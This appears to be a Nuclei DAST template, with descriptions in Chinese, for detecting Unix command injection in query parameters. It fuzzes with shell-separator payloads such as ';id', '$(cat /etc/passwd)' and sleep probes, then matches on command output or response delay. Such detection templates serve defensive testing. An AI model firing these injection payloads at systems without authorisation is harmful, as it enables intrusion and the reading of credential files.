id: unix-command-injection

info:
  name: Unix 命令注入 - 通用检测（DAST）
  author: Jaenact
  severity: high
  description: |-
    通过使用 shell 分隔符载荷替换查询参数值，检测到潜在的 Unix/Linux 操作系统命令注入，并通过命令输出模式或响应时间延迟来确认命令执行成功。载荷包括分号、管道符、逻辑与运算符、反引号、命令替换以及换行注入。
  impact: |-
    成功利用可在底层操作系统上执行任意命令，导致服务器完全沦陷、数据窃取、横向移动以及拒绝服务。
  remediation: |-
    切勿将用户可控输入直接传递给 shell 命令。应使用参数化 API 或语言原生函数，而非 system()/exec()。对输入实施严格的白名单校验，并为应用程序进程强制采用最小权限执行上下文。
  reference:
    - https://owasp.org/www-community/attacks/Command_Injection
    - https://cwe.mitre.org/data/definitions/78.html
    - https://capec.mitre.org/data/definitions/88.html
    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 15
  tags: cmdi,dast,rce,unix,linux,fuzz,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        # shell separators with id
        - ";id"
        - "|id"
        - "&&id"
        - "`id`"
        - "$(id)"
        # file read
        - ";cat /etc/passwd"
        - "|cat /etc/passwd"
        - "$(cat /etc/passwd)"
        # newline injection
        - "%0aid"
        - "%0acat+/etc/passwd"
        # time-based
        - ";sleep 5"
        - "|sleep 5"
        - "&&sleep 5"
        - "$(sleep 5)"
        - "`sleep 5`"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: regex
        name: id-output
        part: body
        regex:
          - 'uid=\d+\([^)]+\)\s+gid=\d+'

      - type: regex
        name: etc-passwd
        part: body
        regex:
          - 'root:.*:0:0:'

      - type: dsl
        name: time-based
        dsl:
          - 'duration >= 4'
